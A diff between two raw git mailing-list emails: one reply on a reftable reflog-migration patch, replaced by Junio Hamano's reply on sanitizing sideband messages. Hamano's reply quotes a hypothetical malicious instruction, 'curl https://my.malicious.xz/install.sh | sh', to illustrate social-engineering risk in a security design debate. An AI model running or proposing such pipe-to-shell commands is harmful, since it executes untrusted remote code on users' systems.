@@ -1,164 +1,152 @@
-Received: from mail-pj1-f50.google.com (mail-pj1-f50.google.com [209.85.216.50])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from fhigh-a3-smtp.messagingengine.com (fhigh-a3-smtp.messagingengine.com [103.168.172.154])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9F82B192B96
-	for <git@vger.kernel.org>; Thu, 16 Jan 2025 06:44:22 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.50
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 442AC192B96
+	for <git@vger.kernel.org>; Thu, 16 Jan 2025 06:45:17 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=103.168.172.154
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1737009869; cv=none; b=sBq+oEyysn2E0IhOdcvDbG4ruGJc6lMc3HacsTfHpLGIxWPo0LT8yfH83Ek76kuP3CWMSWWWd11krKPvDCANISk/7t4mWywbICNz3wUhPiIURKVpJBHF793cc8irZFS4i4G8LO8u3j4WML0EwIF5eSB0tFWxWtM5MTlt+R5P5ZI=
+	t=1737009923; cv=none; b=QA55VDPXRSOjp1tbmO/BcJP+5lal1vwB19uuwFIFYy64WETAnW0Syxp9V9s0oo6cqkpUq9zY5YiPNSr4KGmwOgFbANm74lYtYM2EY8SAJvhO5iV+Z3m6NcAX9Cbf1HGIgtjIiMepj4IsGf2Janau6mzkBoRds6/HQWbBujLEqIQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1737009869; c=relaxed/simple;
-	bh=2trjwCPwrR6gwa6jU0OkJQ7IhBB06nIoZOvXqGBzBoU=;
-	h=From:In-Reply-To:References:MIME-Version:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=uJ7F8oh4K+4Ln4yPcwLtbSIbMNMu000ZTZ+YkxIhSxkIB7deTKTaWV4KYRPo3qn7imammZ3iM6f4tssziLLhQuRlSVytIy47Y28+SvreqJnSxCClVUlyvw2EPwH81sKw/hDYWiJ/XT7/3vgzqe0vTzLv0IMYy1xhj0kaUmZW6dQ=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=TCDqLi4C; arc=none smtp.client-ip=209.85.216.50
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1737009923; c=relaxed/simple;
+	bh=Djehm21JXM2CwC0yvHvmYunGKEJRyTzNugPgMcYqG3M=;
+	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-ID:
+	 MIME-Version:Content-Type; b=dSFoaGg8dRmqNxKQ9Z9dC/V5sSZsMkyJhKd4JBy/DDGqTSmEijQshCnFe57KTkJC+Ki4Bgb6+6KECBx6hyA/4Fv3i/SuGsYs5TPOWbCJE6TONwW5zt9JNcnlOX52iIZ2VW4aCIlXQ+PYDzH697X+lmwIxlh5uQLLQAuffazmHN4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=pobox.com; spf=pass smtp.mailfrom=pobox.com; dkim=pass (2048-bit key) header.d=pobox.com header.i=@pobox.com header.b=u44aI51T; dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b=fUBrFYfB; arc=none smtp.client-ip=103.168.172.154
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=pobox.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pobox.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="TCDqLi4C"
-Received: by mail-pj1-f50.google.com with SMTP id 98e67ed59e1d1-2f44353649aso866331a91.0
-        for <git@vger.kernel.org>; Wed, 15 Jan 2025 22:44:22 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1737009860; x=1737614660; darn=vger.kernel.org;
-        h=cc:to:subject:message-id:date:mime-version:references:in-reply-to
-         :from:from:to:cc:subject:date:message-id:reply-to;
-        bh=JwyoMBSsnziIEeH74wm0O74bLvBEukb/+h6HuHGIqCg=;
-        b=TCDqLi4CgzFznCnYkFSGz8qlUQPm0YOucpmuBx6aL2IoIsFT8Nm+i/LUQDqB8wGdfD
-         qXhwZKVcyg5Y2eOufwJeOGxaQaRIMvK4my3m3umg1nQA2weben6NM1TIG2/aP4Hgp7Gs
-         Mi3Vq66WHBnwOFl8838WkcyVb3VLBiGLxIm1kfLTvnOAEYuHqPD9weqMc4hHgQsDo3QH
-         Bu7aYt4dN1qwmHlt+MjfNyfylxkJc1XC2TsrdSZWorooh9hWmSbaIZKyFONfeYuaYY1z
-         SG1Y3Ioqis0CH44SN2etr0nVLsZZ+ttFhi98rTvlcvYL2E/dOYkKomRwFc2+ImXbDukZ
-         mFZw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1737009860; x=1737614660;
-        h=cc:to:subject:message-id:date:mime-version:references:in-reply-to
-         :from:x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=JwyoMBSsnziIEeH74wm0O74bLvBEukb/+h6HuHGIqCg=;
-        b=Wqdm76fGoXM9tl3J5nZXaqJUBhHK8Y0bIVi8NVRyCrLNiPExa58wFcD60zozF9cFof
-         nJ4mQVILRM3999VCKqLfH2BwqpWkoN68xcjprut1aA7nDbr01kY8w8LkZBTj8FPH4XIC
-         /HUi2ollLXcms+m658AeyzKX+z1OJti8FfFyRnDdqKG9kQuSSWaz436D2NAr53/OQnyG
-         BAepFv3KMAriu+ZZpPBILeM9yswXbPvIk3hgjGFQ+kPdaz1qkUka//RBGUohYp+EucCW
-         /AMbhfZoSfArdT+B2ex3xAVOQ0AWUUYijvrTG+M2w1ihdapchzBWthELc9rUw5pWXV1t
-         jQ9g==
-X-Forwarded-Encrypted: i=1; AJvYcCWVXROetrViPIhoRFF7r7AXtZJXaUQt+Bi5L8k5ByriAPUXZuL0DGI6iiac1mWRqV6xUQ8=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwW2b7o5vXxRzs9ISprzd3x84CES6vuKOIqhmYUd04ITGTK4Myk
-	p9K/aW1jcmULUgry9yRqGGbSOfNhWe/ecCFS8JPO47y1MwCJw83PYEG3psvKGsRmdKGY/4/HZC/
-	Z1kGh8WILifWr9MVUZTsFmOSStiuCyYMK
-X-Gm-Gg: ASbGnctj36PFe92XzZL3AOnMEdMSbQxjEZjN2x6MhjpPw5rfybX7uVbqzP8yR28HPQR
-	hV7L0d4JqwH1lbQm3KYtkDixnmG+HJLrcY5iDia8=
-X-Google-Smtp-Source: AGHT+IGVvx3Cb0a0dz3wFzBOPdVQKy2UlG69ruLkOIFbF9jCs2qtkuON+DbeK/R8y/v8OWXRAReNx/rlKdDnw82WxrM=
-X-Received: by 2002:a17:90b:5403:b0:2ee:d371:3227 with SMTP id
- 98e67ed59e1d1-2f548edf04fmr51100390a91.17.1737009859803; Wed, 15 Jan 2025
- 22:44:19 -0800 (PST)
-Received: from 753933720722 named unknown by gmailapi.google.com with
- HTTPREST; Thu, 16 Jan 2025 01:44:17 -0500
-From: Karthik Nayak <karthik.188@gmail.com>
-In-Reply-To: <xmqqa5bsypht.fsf@gitster.g>
-References: <Z4UbkcmJAU1MT-Rs@tapette.crustytoothpaste.net>
- <CAOLa=ZTL9n_DPhNr49XAd6bT838kc09oVx_AH7Pb4o8VK_xQ9w@mail.gmail.com> <xmqqa5bsypht.fsf@gitster.g>
+	dkim=pass (2048-bit key) header.d=pobox.com header.i=@pobox.com header.b="u44aI51T";
+	dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b="fUBrFYfB"
+Received: from phl-compute-03.internal (phl-compute-03.phl.internal [10.202.2.43])
+	by mailfhigh.phl.internal (Postfix) with ESMTP id 3158A11400DF;
+	Thu, 16 Jan 2025 01:45:16 -0500 (EST)
+Received: from phl-frontend-02 ([10.202.2.161])
+  by phl-compute-03.internal (MEProxy); Thu, 16 Jan 2025 01:45:16 -0500
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=pobox.com; h=cc
+	:cc:content-type:content-type:date:date:from:from:in-reply-to
+	:in-reply-to:message-id:mime-version:references:reply-to:subject
+	:subject:to:to; s=fm1; t=1737009916; x=1737096316; bh=oosOdetSDB
+	PqxISMW8X+doVwxOvMPsjVMjkhEcIKxs0=; b=u44aI51TBuaxByycMhXd36xoz3
+	FRWZWeZHJQkxoTvOUMOciYzT4V5JHkojLiytltt2dU13yM8MZuZ27YUQSdzPM9Je
+	S8RW24d/l0AwU5bkiNq+p65IgVVpKNIzOkWvc5nArUDZ6nv64nVgnIigOt1ZJ7UW
+	SlpbR+firAJn07C+QHpzwgunHOxv4zLFu+nHnOMkbvbcPldEL6vt0klwjrOovVxK
+	shfExAvmsTxmMZTWVgRyWsibR02znlVa6bELt1HfGbJq2TJHywCfkLDcB6WclfmB
+	2dbQWwLL8FOnpZL8xUqfaFUUUcAgShG8iFFGCmdtWLvJ14ABwdUhwLkj2KUw==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=cc:cc:content-type:content-type:date:date
+	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
+	:message-id:mime-version:references:reply-to:subject:subject:to
+	:to:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm2; t=
+	1737009916; x=1737096316; bh=oosOdetSDBPqxISMW8X+doVwxOvMPsjVMjk
+	hEcIKxs0=; b=fUBrFYfBotfVLMNB9ISdrkINjUewUcommhEt+CdIJaMJrcsLuK/
+	oNsEbpXmH3yq6njv2QjNGXHLSodDHGFK9T++Gr8deDYGmEmfk3RiWHcTEKlACEgv
+	RpGK9mvo+3tjRuy/LTfmtpwVgZUroHQeSQGAu3HS4XnszH0TzAr0DS0csK93CIiL
+	BWyQmaZ1PLKinCcDJ+o5yTBWbRFYfY8yAB3h7wIx9MoD2Gt/e8PF1CGDPs0D7cBW
+	yXwg/I2IckIieHuudQ5UHHKjnPVlY4OEHPpOfwefDxjvIJGKY+GP4HoQcC3umTNa
+	a7OLo9Ir8GEykx6hEl4TCEuFXVDJ/m1ABPg==
+X-ME-Sender: <xms:-6qIZywknLEOEwH0Y2NDhaydIWR2OJBrd27sTTXgetz9Onb3WoFwCA>
+    <xme:-6qIZ-QKgbC3WZ5-FxgFiGeSCIw7gJsVBBmuuCfBRrspthkucT9xMJlP7hZtO4Bsk
+    Z4lM8h4oME0HpP-ag>
+X-ME-Received: <xmr:-6qIZ0XTStC3-XTQZJK_HA6Q08bPRZlzlHBqQ3CzEwquvUCwijBoVLlFh8f_HWiaTe0h9gFkNxsQ4K1HB6M9AQ1shXQJWOef8WtI>
+X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeefuddrudeitddgleegucetufdoteggodetrfdotf
+    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdggtfgfnhhsuhgsshgtrhhisggvpdfu
+    rfetoffkrfgpnffqhgenuceurghilhhouhhtmecufedttdenucesvcftvggtihhpihgvnh
+    htshculddquddttddmnecujfgurhephffvvefujghffffkfgggtgesthdtofdttdertden
+    ucfhrhhomheplfhunhhiohcuvecujfgrmhgrnhhouceoghhithhsthgvrhesphhosghogi
+    drtghomheqnecuggftrfgrthhtvghrnhepleeggedttdetheduffefueeufedtveeuvddu
+    gfevhfelkeejleelgeekiefggfeinecuffhomhgrihhnpeigiihinhhsthgrlhhlrdhshh
+    enucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpehgihht
+    shhtvghrsehpohgsohigrdgtohhmpdhnsggprhgtphhtthhopeehpdhmohguvgepshhmth
+    hpohhuthdprhgtphhtthhopehsrghnuggrlhhssegtrhhushhthihtohhothhhphgrshht
+    vgdrnhgvthdprhgtphhtthhopehgihhtghhithhgrggughgvthesghhmrghilhdrtghomh
+    dprhgtphhtthhopehgihhtsehvghgvrhdrkhgvrhhnvghlrdhorhhgpdhrtghpthhtohep
+    jhhohhgrnhhnvghsrdhstghhihhnuggvlhhinhesghhmgidruggvpdhrtghpthhtohepgh
+    hithhsthgvrhesphhosghogidrtghomh
+X-ME-Proxy: <xmx:-6qIZ4heK8jgVLqSy5Tlbp9nT9bd4RbN115nnAHT3Hw2fuGA4XxQ3g>
+    <xmx:-6qIZ0A0CYNo44GJxAbDw5Ngh8QTucz3Xabf5uRheexA10QUoIJFHg>
+    <xmx:-6qIZ5Jbwzt0-cao4UXJ31jKZUNv2kB-nIzQ84-EiqTaJd3eFDs7Ag>
+    <xmx:-6qIZ7C6qG-S9XHNYN0nvGdW2MV58TBKzBa4r0p3IaXodNFmSc7U-Q>
+    <xmx:_KqIZz4Jc_QPaOUN9uMvFGRonOrmebzCRBWER38Rs33gsFnQnhAZEMZB>
+Feedback-ID: if26b431b:Fastmail
+Received: by mail.messagingengine.com (Postfix) with ESMTPA; Thu,
+ 16 Jan 2025 01:45:15 -0500 (EST)
+From: Junio C Hamano <gitster@pobox.com>
+To: "brian m. carlson" <sandals@crustytoothpaste.net>
+Cc: Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>,
+  git@vger.kernel.org,  Johannes Schindelin <johannes.schindelin@gmx.de>
+Subject: Re: [PATCH 0/3] Sanitize sideband channel messages
+In-Reply-To: <Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net> (brian
+	m. carlson's message of "Tue, 14 Jan 2025 22:50:25 +0000")
+References: <pull.1853.git.1736878772.gitgitgadget@gmail.com>
+	<Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net>
+Date: Wed, 15 Jan 2025 22:45:13 -0800
+Message-ID: <xmqqwmevtfye.fsf@gitster.g>
+User-Agent: Gnus/5.13 (Gnus v5.13)
 Precedence: bulk
 X-Mailing-List: git@vger.kernel.org
 List-Id: <git.vger.kernel.org>
 List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Date: Thu, 16 Jan 2025 01:44:17 -0500
-X-Gm-Features: AbW1kvbJR_BNsE2xgCJiwkr7sTiJI2hH7Tkrrm0_PFwFtu8ClLDJgyTBDFa0guA
-Message-ID: <CAOLa=ZR6jbJwav0+3-A+3w=XRU02Lp_9Mm4RXbN6A00-N3Xq-g@mail.gmail.com>
-Subject: Re: Bug in 2.48 with `git refs migrate`
-To: Junio C Hamano <gitster@pobox.com>
-Cc: "brian m. carlson" <sandals@crustytoothpaste.net>, git@vger.kernel.org, 
-	Patrick Steinhardt <ps@pks.im>
-Content-Type: multipart/mixed; boundary="000000000000aa5ab7062bcd1f0c"
+Content-Type: text/plain
 
---000000000000aa5ab7062bcd1f0c
-Content-Type: text/plain; charset="UTF-8"
+"brian m. carlson" <sandals@crustytoothpaste.net> writes:
 
-Junio C Hamano <gitster@pobox.com> writes:
+> Where pre-receive hooks are available, people frequently run various
+> commands to test and analyze code in them, including build or static
+> analysis tools, such as Rust's Cargo.  Cargo is capable of printing a
+> wide variety of escape sequences in its output, including `\e[K`, which
+> overwrites text to the right (e.g., for progress bars and status output
+> much like Git produces), and sequences for hyperlinks.  Stripping these
+> sequences would break the output in ways that would be confusing to the
+> user (since they work fine in a regular terminal) and hard to
+> reproduce or fix.
 
-> Karthik Nayak <karthik.188@gmail.com> writes:
+You have ruled out the attack vector that lets bytestream sent to
+the terminal emulator to somehow cause arbitrary input bytes added
+(which may require the final <ENTER> from the user but that is not
+much of consolation), and I tend to agree with you on that point.
+
+With that misfeature out of the picture, I am not sure why terminal
+escape sequences that may clear or write-over things on the screen
+are of particular interest.  If the malicious remote end says
+something like
+
+    To proceed, open another window and type this command:
+
+	$ curl https://my.malicious.xz/install.sh | sh
+
+to its output, even if the message is shown with the "remote: "
+prefix on the receiving local client, wouldn't that cause certain
+percentage of end-user population to copy-and-paste that command
+anyway?
+
+> I agree that this would have been a nice feature to add at the beginning
+> of the development of the sideband feature, but I fear that it is too
+> late to make an incompatible change now.
+
+So I am not so sure even it would have been a "nice feature" to disallow
+sideband messages to carry terminal escape sequences to begin with.
+
+> I realize that you've provided an escape hatch, but as we've seen with
+> other defense-in-depth measures, that doesn't avoid the inconvenience
+> and hassle of dealing with those changes and the costs of deploying
+> fixes everywhere.
+
+One more thing that I am not so happy about these "escape hatches"
+is that they tend to be all or nothing (not limited to this round,
+but common to other defense-in-depth attempts).  Having to say "I
+trust them completely" is something that would make people uneasy.
+
+> We need to consider the costs and impact of these
+> patches on our users, including the burden of dealing with incompatible
+> changes, and given the fact that this problem can occur in a wide
+> variety of other contexts which you are not solving here and which would
+> be better solved more generally in terminal emulators themselves, I
+> don't think the benefits of this approach outweigh the downsides.
 >
->> Subject: [PATCH] reftable: write correct max_update_index to header
->>
->> In 297c09eabb (refs: allow multiple reflog entries for the same refname,
->> 2024-12-16), the reftable backend learned to handle multiple reflog
->> entries within the same transaction. This was done modifying the
->
-> "done" -> "done by", I think.
->
-
-Yup, thanks!
-
->> To fix the issue, the appropriate `max_update_index` limit must be set
->> even before the first block is written. Add a `max_index` field to the
->> transaction which holds the `max_index` within all its updates, then
->> propagate this value to the reftable backend, wherein this is used to
->> the set the `max_update_index` correctly.
->
->
->> diff --git a/refs.c b/refs.c
->> index 0f41b2fd4a..f7b6f0f897 100644
->> --- a/refs.c
->> +++ b/refs.c
->> @@ -1345,6 +1345,13 @@ int ref_transaction_update_reflog(struct
->
-> Not the focus of this topic/fix, but I notice that the only caller
-> of this ref_transaction_update_reflog() function is a static
-> function migrate_one_reflog_entry() in the same file.  Do we expect
-> that we would add more callers?  Otherwise we should make it a file
-> scope static and remove it from <refs.h> file.
->
-
-I don't think we expect any other callers now. Maybe someday we'd expose
-creating reflogs to the users. But for now, making it static is more
-worthwhile.
-
-Let's follow the boy scout rule and clean this up, I'll add a commit to
-do the same in v2 of my patch.
-
->> ref_transaction *transaction,
->>  	update->flags &= ~REF_HAVE_OLD;
->>  	update->index = index;
->>
->> +	/*
->> +	 * Reference backends may need to know the max index to optimize
->> +	 * their writes. So we store the max_index on the transaction level.
->> +	 */
->> +	if (index > transaction->max_index)
->> +		transaction->max_index = index;
->> +
->>  	return 0;
->>  }
->
-> So from the problem description, whenever we consume an index by
-> assigning it to an update that belongs to a transaction, we must
-> make sure that transaction's max_index covers that value of the
-> index?  I was wondering if we should have a less error prone way to
-> do that by having a helper function that takes ref_update and
-> ref_transaction objects to do the above, but this is exclusively
-> used by reflog migration code path and nowhere else, so it may
-> probably be fine as-is.  I dunno.
-
-Yup, that's correct. It should be okay, but let me do it anyways, makes
-it safer for the future.
-
---000000000000aa5ab7062bcd1f0c
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Disposition: attachment; filename="signature.asc"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: 9a92ca1021fffc88_0.1
-
-LS0tLS1CRUdJTiBQR1AgU0lHTkFUVVJFLS0tLS0KCmlRSEtCQUVCQ2dBMEZpRUVWODVNZjJOMWNR
-L0xaY1lHUHRXZkpJNUdqSDhGQW1lSXFyb1dIR3RoY25Sb2FXc3UKTVRnNFFHZHRZV2xzTG1OdmJR
-QUtDUkErMVo4a2prYU1meHB2Qy93SkM3U094WUxHS1pxZlp5OUdTVzdnbGZFWQphVUUwSVpzMDdJ
-K001Q1JHWkpiWUc2eFpvWVN3cXhLRDJhVzdsRmxsUWg1UFIzMThzVFlBMEhLb01uaGJra2ZtCkJS
-ZnBLelVBalhGRld3em1SY29iRmJlLzR0aXl2QTJ1cVFhcG9yckFuTkM2OHdJYnd6azJxNHRudm1V
-c0dhYlgKeEpnZGg2OFRtc25iQ2pYbWhXc2xwdFp3bXNTOE5vUGM4bHRUdXJTRS9qSndteEhuSlZW
-bTBnRko2Kzk5dGNZRgpXVlZSbVlaMGd3elMvSXE4Y2liNGpqbnlKRi9XdU9Jem5PZWw4VHQyY1Ur
-TnBpMEtGUXNaSWVza0JMMlljWkNhCi9RMWU5WkV1MjhHaWpYUStPKytWMStVS1AzZmNiZ3crRDhW
-TFVYS0tZc2FSalhNeGJ3cEd5N3RRdlBJbGpJWVcKZHhhVVJKSm12Q1ZkRU9Rb0N6SmVpNGlrMW1q
-Y29pbm1aazdqQjMra1Z0MnlCUWpOdTlVRkliSXAxUDF3NUMrZgpBVlpYTllCTjRwSjR3dWhSOWsv
-WmE2eDQxVnBhQTFjV1drUVFYR05meFl3L0ZqM2ZQamh5QlFKd0JvNlYxN3BiCnBSU004Yk9US3di
-Z0txSXpKN2tuZndtWm12UFgvUEJ0RStQOFlZRT0KPVdDWGEKLS0tLS1FTkQgUEdQIFNJR05BVFVS
-RS0tLS0t
---000000000000aa5ab7062bcd1f0c--
+> I do agree that there are terminal emulators which have some surprising
+> and probably insecure behaviour, as we've discussed in the past, but
+> because I believe those issues are more general and could be a problem
+> for any terminal-using program, I continue to believe that those issues
+> are best addressed in the terminal emulator itself.
